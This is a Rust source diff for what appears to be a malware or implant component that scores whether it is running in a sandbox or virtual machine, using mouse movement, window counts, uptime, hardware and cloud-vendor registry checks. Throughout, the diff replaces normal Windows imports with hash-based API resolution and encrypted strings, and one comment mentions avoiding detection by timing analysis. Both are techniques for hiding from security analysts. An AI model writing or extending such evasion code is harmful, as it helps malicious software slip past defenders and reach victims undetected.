@@ -14,8 +14,15 @@ pub struct SandboxMetrics {
 
 #[cfg(windows)]
 pub fn check_mouse_movement() -> u8 {
-    use winapi::um::winuser::GetCursorPos;
     use winapi::shared::windef::POINT;
+
+    let get_cursor_pos: super::win_resolve::FnGetCursorPos = unsafe {
+        super::win_resolve::resolve_api_or_load(
+            super::win_resolve::USER32_DLL_W,
+            super::win_resolve::HASH_USER32_DLL,
+            super::win_resolve::HASH_GETCURSORPOS,
+        ).expect("GetCursorPos not found")
+    };
 
     // Take 4 samples over ~1 second total.  Previously this was 20 × 500 ms = 10 s,
     // which stalled startup long enough to be trivially detected by timing analysis.
@@ -27,7 +34,7 @@ pub fn check_mouse_movement() -> u8 {
     for _ in 0..4 {
         let mut pt = POINT { x: 0, y: 0 };
         unsafe {
-            if GetCursorPos(&mut pt) != 0 {
+            if get_cursor_pos(&mut pt) != 0 {
                 positions.push((pt.x, pt.y));
             }
         }
@@ -206,56 +213,101 @@ pub fn check_mouse_movement() -> u8 {
 
 #[cfg(windows)]
 pub fn check_desktop_windows() -> u8 {
-    use winapi::um::winuser::{EnumWindows, GetWindowTextLengthW, IsWindowVisible};
-    use winapi::shared::minwindef::{BOOL, LPARAM, TRUE, FALSE};
+    use winapi::shared::minwindef::{BOOL, LPARAM, TRUE};
     use winapi::shared::windef::HWND;
+
+    // Resolve registry functions from advapi32.
+    let reg_open_key_ex_w: super::win_resolve::FnRegOpenKeyExW = unsafe {
+        super::win_resolve::resolve_api_or_load(
+            super::win_resolve::ADVAPI32_DLL_W,
+            super::win_resolve::HASH_ADVAPI32_DLL,
+            super::win_resolve::HASH_REGOPENKEYEXW,
+        ).expect("RegOpenKeyExW not found")
+    };
+    let reg_query_value_ex_w: super::win_resolve::FnRegQueryValueExW = unsafe {
+        super::win_resolve::resolve_api(
+            super::win_resolve::HASH_ADVAPI32_DLL,
+            super::win_resolve::HASH_REGQUERYVALUEEXW,
+        ).expect("RegQueryValueExW not found")
+    };
+    let reg_close_key: super::win_resolve::FnRegCloseKey = unsafe {
+        super::win_resolve::resolve_api(
+            super::win_resolve::HASH_ADVAPI32_DLL,
+            super::win_resolve::HASH_REGCLOSEKEY,
+        ).expect("RegCloseKey not found")
+    };
 
     // On Windows Server Core (headless) there is no desktop shell, so the
     // visible window count will be 0-2 regardless of whether we are in a VM.
     // Penalising a Server Core deployment is a false positive.  Detect it
     // via the InstallationType registry value and return neutral (0) instead.
-    #[cfg(windows)]
     {
-        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE};
-        use winapi::um::winnt::{KEY_READ, REG_SZ};
         let subkey: Vec<u16> = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0".encode_utf16().collect();
         let value: Vec<u16> = "InstallationType\0".encode_utf16().collect();
         unsafe {
             let mut hkey = std::ptr::null_mut();
-            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) == 0 {
+            if reg_open_key_ex_w(super::win_resolve::HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, super::win_resolve::KEY_READ, &mut hkey) == 0 {
                 let mut buf = vec![0u16; 64];
                 let mut buf_len = (buf.len() * 2) as u32;
                 let mut val_type: u32 = 0;
-                if RegQueryValueExW(hkey, value.as_ptr(), std::ptr::null_mut(), &mut val_type, buf.as_mut_ptr() as _, &mut buf_len) == 0 && val_type == REG_SZ {
-                    RegCloseKey(hkey);
+                if reg_query_value_ex_w(hkey, value.as_ptr(), std::ptr::null_mut(), &mut val_type, buf.as_mut_ptr() as _, &mut buf_len) == 0 && val_type == super::win_resolve::REG_SZ {
+                    reg_close_key(hkey);
                     let nul = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
                     let install_type = String::from_utf16_lossy(&buf[..nul]);
                     if install_type == "Server Core" {
                         return 0; // neutral — headless by design, not a sandbox
                     }
                 } else {
-                    RegCloseKey(hkey);
+                    reg_close_key(hkey);
                 }
             }
         }
     }
-    
+
+    // Resolve user32 functions and store callback-target ones in static atomics.
+    let is_window_visible: super::win_resolve::FnIsWindowVisible = unsafe {
+        super::win_resolve::resolve_api_or_load(
+            super::win_resolve::USER32_DLL_W,
+            super::win_resolve::HASH_USER32_DLL,
+            super::win_resolve::HASH_ISWINDOWVISIBLE,
+        ).expect("IsWindowVisible not found")
+    };
+    let get_window_text_length_w: super::win_resolve::FnGetWindowTextLengthW = unsafe {
+        super::win_resolve::resolve_api(
+            super::win_resolve::HASH_USER32_DLL,
+            super::win_resolve::HASH_GETWINDOWTEXTLENGTHW,
+        ).expect("GetWindowTextLengthW not found")
+    };
+    let enum_windows: super::win_resolve::FnEnumWindows = unsafe {
+        super::win_resolve::resolve_api(
+            super::win_resolve::HASH_USER32_DLL,
+            super::win_resolve::HASH_ENUMWINDOWS,
+        ).expect("EnumWindows not found")
+    };
+
+    super::win_resolve::ISWINDOWVISIBLE_PTR.store(is_window_visible as u64, std::sync::atomic::Ordering::SeqCst);
+    super::win_resolve::GETWINDOWTEXTLENGTHW_PTR.store(get_window_text_length_w as u64, std::sync::atomic::Ordering::SeqCst);
+
     unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
         let count = &mut *(lparam as *mut usize);
-        if IsWindowVisible(hwnd) != 0 {
-            let length = GetWindowTextLengthW(hwnd);
+        let is_visible_fn: super::win_resolve::FnIsWindowVisible =
+            std::mem::transmute(super::win_resolve::ISWINDOWVISIBLE_PTR.load(std::sync::atomic::Ordering::SeqCst));
+        let get_text_len_fn: super::win_resolve::FnGetWindowTextLengthW =
+            std::mem::transmute(super::win_resolve::GETWINDOWTEXTLENGTHW_PTR.load(std::sync::atomic::Ordering::SeqCst));
+        if is_visible_fn(hwnd) != 0 {
+            let length = get_text_len_fn(hwnd);
             if length > 0 {
                 *count += 1;
             }
         }
         TRUE
     }
-    
+
     let mut count: usize = 0;
     unsafe {
-        EnumWindows(Some(enum_windows_proc), &mut count as *mut _ as LPARAM);
+        enum_windows(Some(enum_windows_proc), &mut count as *mut _ as LPARAM);
     }
-    
+
     if count < 3 {
         20
     } else if count < 8 {
@@ -400,17 +452,20 @@ pub fn check_desktop_windows() -> u8 {
 
 #[cfg(windows)]
 pub fn check_system_uptime_artifacts() -> u8 {
-    use winapi::um::sysinfoapi::GetTickCount64;
-    
-    let uptime_ms = unsafe { GetTickCount64() };
+    let get_tick_count_64: super::win_resolve::FnGetTickCount64 = unsafe {
+        super::win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, super::win_resolve::HASH_GETTICKCOUNT64)
+            .expect("GetTickCount64 not found")
+    };
+
+    let uptime_ms = unsafe { get_tick_count_64() };
     let uptime_mins = uptime_ms / 60000;
     let uptime_hours = uptime_mins / 60;
-    
+
     let mut temp_files_count = 0;
     if let Ok(temp_dir) = std::env::temp_dir().read_dir() {
         temp_files_count = temp_dir.count();
     }
-    
+
     if uptime_mins < 10 && temp_files_count < 5 {
         20
     } else if uptime_hours < 24 && temp_files_count < 20 {
@@ -542,9 +597,23 @@ fn is_cloud_instance_sandbox() -> bool {
 
     #[cfg(windows)]
     {
-        use winapi::um::winnt::{KEY_READ, REG_SZ};
-        use winapi::um::winreg::{
-            RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE,
+        let reg_open_key_ex_w: super::win_resolve::FnRegOpenKeyExW = unsafe {
+            super::win_resolve::resolve_api(
+                super::win_resolve::HASH_ADVAPI32_DLL,
+                super::win_resolve::HASH_REGOPENKEYEXW,
+            ).expect("RegOpenKeyExW not found")
+        };
+        let reg_query_value_ex_w: super::win_resolve::FnRegQueryValueExW = unsafe {
+            super::win_resolve::resolve_api(
+                super::win_resolve::HASH_ADVAPI32_DLL,
+                super::win_resolve::HASH_REGQUERYVALUEEXW,
+            ).expect("RegQueryValueExW not found")
+        };
+        let reg_close_key: super::win_resolve::FnRegCloseKey = unsafe {
+            super::win_resolve::resolve_api(
+                super::win_resolve::HASH_ADVAPI32_DLL,
+                super::win_resolve::HASH_REGCLOSEKEY,
+            ).expect("RegCloseKey not found")
         };
 
         let subkey: Vec<u16> =
@@ -552,11 +621,15 @@ fn is_cloud_instance_sandbox() -> bool {
         let manufacturer_value_name: Vec<u16> = "SystemManufacturer\0".encode_utf16().collect();
         let product_value_name: Vec<u16> = "SystemProductName\0".encode_utf16().collect();
 
-        unsafe fn query_reg_sz(hkey: winapi::shared::minwindef::HKEY, name: &[u16]) -> Option<String> {
+        unsafe fn query_reg_sz(
+            reg_query_value_ex_w: super::win_resolve::FnRegQueryValueExW,
+            hkey: *mut std::ffi::c_void,
+            name: &[u16],
+        ) -> Option<String> {
             let mut buf = vec![0u16; 256];
             let mut buf_len = (buf.len() * 2) as u32;
             let mut val_type: u32 = 0;
-            if RegQueryValueExW(
+            if reg_query_value_ex_w(
                 hkey,
                 name.as_ptr(),
                 std::ptr::null_mut(),
@@ -564,7 +637,7 @@ fn is_cloud_instance_sandbox() -> bool {
                 buf.as_mut_ptr() as _,
                 &mut buf_len,
             ) != 0
-                || val_type != REG_SZ
+                || val_type != super::win_resolve::REG_SZ
             {
                 return None;
             }
@@ -574,23 +647,23 @@ fn is_cloud_instance_sandbox() -> bool {
 
         unsafe {
             let mut hkey = std::ptr::null_mut();
-            if RegOpenKeyExW(
-                HKEY_LOCAL_MACHINE,
+            if reg_open_key_ex_w(
+                super::win_resolve::HKEY_LOCAL_MACHINE,
                 subkey.as_ptr(),
                 0,
-                KEY_READ,
+                super::win_resolve::KEY_READ,
                 &mut hkey,
             ) == 0
             {
-                let vendor = query_reg_sz(hkey, &manufacturer_value_name)
+                let vendor = query_reg_sz(reg_query_value_ex_w, hkey, &manufacturer_value_name)
                     .unwrap_or_default()
                     .trim()
                     .to_string();
-                let product = query_reg_sz(hkey, &product_value_name)
+                let product = query_reg_sz(reg_query_value_ex_w, hkey, &product_value_name)
                     .unwrap_or_default()
                     .trim()
                     .to_string();
-                RegCloseKey(hkey);
+                reg_close_key(hkey);
 
                 let vendor_lc = vendor.to_lowercase();
                 let product_lc = product.to_lowercase();
@@ -640,40 +713,51 @@ fn is_cloud_instance_sandbox() -> bool {
 
 #[cfg(windows)]
 pub fn check_hardware_plausibility() -> u8 {
-    use winapi::um::fileapi::GetDiskFreeSpaceExW;
-    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, GetSystemInfo, SYSTEM_INFO, MEMORYSTATUSEX};
-    use winapi::shared::minwindef::TRUE;
-    
+    use super::win_resolve::{SystemInfo, MemoryStatusEx};
+
+    let get_disk_free_space_ex_w: super::win_resolve::FnGetDiskFreeSpaceExW = unsafe {
+        super::win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, super::win_resolve::HASH_GETDISKFREESPACEEXW)
+            .expect("GetDiskFreeSpaceExW not found")
+    };
+    let global_memory_status_ex: super::win_resolve::FnGlobalMemoryStatusEx = unsafe {
+        super::win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, super::win_resolve::HASH_GLOBALMEMORYSTATUSEX)
+            .expect("GlobalMemoryStatusEx not found")
+    };
+    let get_system_info: super::win_resolve::FnGetSystemInfo = unsafe {
+        super::win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, super::win_resolve::HASH_GETSYSTEMINFO)
+            .expect("GetSystemInfo not found")
+    };
+
     let mut total_bytes: u64 = 0;
     let mut free_bytes_available: u64 = 0;
     let mut total_free_bytes: u64 = 0;
-    
+
     let c_drive: Vec<u16> = std::str::from_utf8(&enc_str!("C:\\")).unwrap().encode_utf16().chain(std::iter::once(0)).collect();
-    
+
     unsafe {
-        GetDiskFreeSpaceExW(
+        get_disk_free_space_ex_w(
             c_drive.as_ptr(),
-            &mut free_bytes_available as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
-            &mut total_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
-            &mut total_free_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
+            &mut free_bytes_available,
+            &mut total_bytes,
+            &mut total_free_bytes,
         );
     }
-    
-    let mut mem_status: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
-    mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
+
+    let mut mem_status: MemoryStatusEx = unsafe { std::mem::zeroed() };
+    mem_status.dw_length = std::mem::size_of::<MemoryStatusEx>() as u32;
     unsafe {
-        GlobalMemoryStatusEx(&mut mem_status);
+        global_memory_status_ex(&mut mem_status);
     }
-    
-    let mut sys_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
+
+    let mut sys_info: SystemInfo = unsafe { std::mem::zeroed() };
     unsafe {
-        GetSystemInfo(&mut sys_info);
+        get_system_info(&mut sys_info);
     }
-    
+
     let disk_gb = total_bytes / (1024 * 1024 * 1024);
-    let ram_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
-    let cpus = sys_info.dwNumberOfProcessors;
-    
+    let ram_gb = mem_status.ull_total_phys / (1024 * 1024 * 1024);
+    let cpus = sys_info.dw_number_of_processors;
+
     let cloud_instance = is_cloud_instance_sandbox();
     let mut below_threshold_count: u8 = 0;
     // Thresholds are scored differently for cloud hosts to reduce false
